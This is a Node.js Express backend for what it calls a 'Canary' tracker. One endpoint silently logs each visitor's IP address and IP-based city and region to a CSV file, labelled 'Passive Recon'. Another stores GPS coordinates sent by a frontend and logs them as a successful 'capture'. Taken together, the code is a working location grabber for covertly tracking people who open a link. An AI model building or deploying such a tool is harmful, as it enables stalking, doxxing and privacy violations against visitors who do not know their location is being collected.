const express = require('express');
const cors = require('cors');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;
const CSV_FILE_PATH = path.join(__dirname, 'logs.csv');

// Initialize logs.csv with forensic headers
if (!fs.existsSync(CSV_FILE_PATH)) {
  fs.writeFileSync(CSV_FILE_PATH, 'Timestamp,IP,City,Region,Latitude,Longitude,Type\n');
}

// Middleware
app.use(cors({ origin: '*' }));

app.use(express.json());
app.use(requestIp.mw());

const logVisitToCSV = (ip, city, region, type, lat = '', lng = '') => {
  const timestamp = new Date().toISOString();
  const csvRow = `${timestamp},${ip},${city},${region},${lat},${lng},${type}\n`;
  fs.appendFileSync(CSV_FILE_PATH, csvRow);
};

// SILENT LOGGING (Passive Recon)
app.post('/api/log-visit', (req, res) => {
  try {
    let ip = req.clientIp || req.ip;
    if (ip === '::1' || ip === '127.0.0.1') ip = "8.8.8.8"; // Dummy IP for local testing
    
    const geo = geoip.lookup(ip) || { city: 'Unknown', region: 'Unknown' };
    logVisitToCSV(ip, geo.city, geo.region, 'IP-Based (Passive)');
    
    console.log(`[!] Passive Hit: ${ip} (${geo.city})`);
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// GPS LOGGING (Active Forensics)
app.post('/api/log-gps', (req, res) => {
  try {
    const { lat, lng } = req.body;
    let ip = req.clientIp || req.ip;
    if (ip === '::1' || ip === '127.0.0.1') ip = "8.8.8.8";

    const geo = geoip.lookup(ip) || { city: 'Unknown', region: 'Unknown' };
    logVisitToCSV(ip, geo.city, geo.region, 'GPS-Based (Active)', lat, lng);
    
    console.log(`[!!!] SUCCESS: GPS Captured -> Lat: ${lat}, Lng: ${lng}`);
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// Serve frontend static files
// app.use(express.static(path.join(__dirname, '../frontend/dist')));

// app.get('*', (req, res) => {
//   res.sendFile(path.join(__dirname, '../frontend/dist/index.html'));
// });

app.listen(PORT, () => console.log(`Canary backend running on port ${PORT}`));